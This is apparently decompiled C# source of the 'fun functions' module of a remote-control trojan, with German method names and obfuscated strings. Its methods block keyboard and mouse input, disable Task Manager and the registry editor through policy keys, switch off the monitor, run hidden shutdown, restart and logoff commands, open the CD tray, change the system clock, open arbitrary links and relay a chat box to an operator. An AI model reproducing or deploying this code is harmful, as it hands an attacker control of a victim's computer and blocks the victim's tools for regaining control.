using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns1;

public class FunFunktionen
{
	private enum Params
	{
		SC_MONITORPOWER = 61808,
		WM_SYSCOMMAND = 274,
		TURN_MONITOR_OFF = 2,
		TURN_MONITOR_ON = -1
	}

	private struct SYSTEMTIME
	{
		public short Year;

		public short Month;

		public short DayOfWeek;

		public short Day;

		public short Hour;

		public short Minute;

		public short Second;

		public short Milliseconds;
	}

	public delegate void ChatMSGEventHandler(string sText);

	private const long API_FALSE = 0L;

	private const long API_TRUE = 1L;

	private ChatMSGEventHandler ChatMSGEvent;

	public event ChatMSGEventHandler ChatMSG
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		add
		{
			ChatMSGEvent = (ChatMSGEventHandler)Delegate.Combine(ChatMSGEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		remove
		{
			ChatMSGEvent = (ChatMSGEventHandler)Delegate.Remove(ChatMSGEvent, value);
		}
	}

	[DebuggerNonUserCode]
	public FunFunktionen()
	{
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long mciExecute([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrcommand);

	[DllImport("user32.dll")]
	private static extern void SendMessageA(IntPtr hWnd, int uMsg, int wParam, int lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool SetLocalTime(ref SYSTEMTIME time);

	private IntPtr Handle()
	{
		throw new NotImplementedException();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long BlockInput(long fBlock);

	public bool method_0()
	{
		try
		{
			string lpstrcommand = GClass0.smethod_0("Fűɧ\u0332ђՔٮݻࡩ॥\u0a64ପ౭൧\u0e68\u0f74ဥᅫታ፧ᑯ");
			mciExecute(ref lpstrcommand);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object InputChatBox(string titel, string stext)
	{
		try
		{
			Thread thread = new Thread(delegate(object a0)
			{
				InputThread((string[])a0);
			});
			thread.IsBackground = true;
			thread.Start(new string[2] { stext, titel });
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void InputThread(string[] sText)
	{
		string text = Interaction.InputBox(sText[0], sText[1], GClass0.smethod_0(""), -1, -1);
		if (Operators.CompareString(text, GClass0.smethod_0(""), false) != 0)
		{
			ChatMSGEvent?.Invoke(text);
		}
	}

	public bool TastaturMaus_Bloeckieren()
	{
		try
		{
			BlockInput(1L);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object DisableTaskmanager(bool b)
	{
		try
		{
			if (b)
			{
				Registry.CurrentUser.OpenSubKey(GClass0.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass0.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), GClass0.smethod_0("0"), RegistryValueKind.DWord);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey(GClass0.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass0.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), GClass0.smethod_0("1"), RegistryValueKind.DWord);
			}
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object DisableRegedit(bool b)
	{
		try
		{
			if (b)
			{
				Registry.CurrentUser.OpenSubKey(GClass0.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass0.smethod_0("PźɡͰѲգ٫ݟࡩ६\u0a63\u0b7a౼൵\u0e7fད\u106bᅬቮ፲"), GClass0.smethod_0("0"), RegistryValueKind.DWord);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey(GClass0.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass0.smethod_0("PźɡͰѲգ٫ݟࡩ६\u0a63\u0b7a౼൵\u0e7fད\u106bᅬቮ፲"), GClass0.smethod_0("1"), RegistryValueKind.DWord);
			}
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool TastaturMaus_Entblocken()
	{
		try
		{
			BlockInput(0L);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool method_1()
	{
		try
		{
			string lpstrcommand = GClass0.smethod_0("Dųɡ\u0334ѐՖ\u0670ݥ\u086b१\u0a62ବ౯\u0d65\u0e66\u0f7aဧᅥቩ፫ᑰᕧᙥ");
			mciExecute(ref lpstrcommand);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool MonitorAusschalten()
	{
		try
		{
			SendMessageA(Handle(), 274, 61808, 2);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool MonitorEinschalten()
	{
		try
		{
			SendMessageA(Handle(), 274, 61808, -1);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool Runterfahren()
	{
		try
		{
			Interaction.Shell(GClass0.smethod_0("xŢɼͼѣթٲݪ\u0823यੲ"), (AppWinStyle)2, false, -1);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool NeuStarten()
	{
		try
		{
			Interaction.Shell(GClass0.smethod_0("yšɽ\u0363ѩղ٪ܣ\u082fॳ"), (AppWinStyle)2, false, -1);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool Abmelden()
	{
		try
		{
			Interaction.Shell(GClass0.smethod_0("yšɽ\u0363ѩղ٪ܣ\u082f७"), (AppWinStyle)2, false, -1);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool method_2(string Link)
	{
		try
		{
			Process.Start(Link);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool SetTime(int Jahr, int Monat, int Tag, int Stunde, int Minute, int Sekunde, int Millisekunde, object DayofTheWeek)
	{
		checked
		{
			try
			{
				SYSTEMTIME time = default(SYSTEMTIME);
				time.Day = (short)Tag;
				time.DayOfWeek = Conversions.ToShort(DayofTheWeek);
				time.Hour = (short)Stunde;
				time.Milliseconds = (short)Millisekunde;
				time.Minute = (short)Minute;
				time.Month = (short)Monat;
				time.Second = (short)Sekunde;
				time.Year = (short)Jahr;
				SetLocalTime(ref time);
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
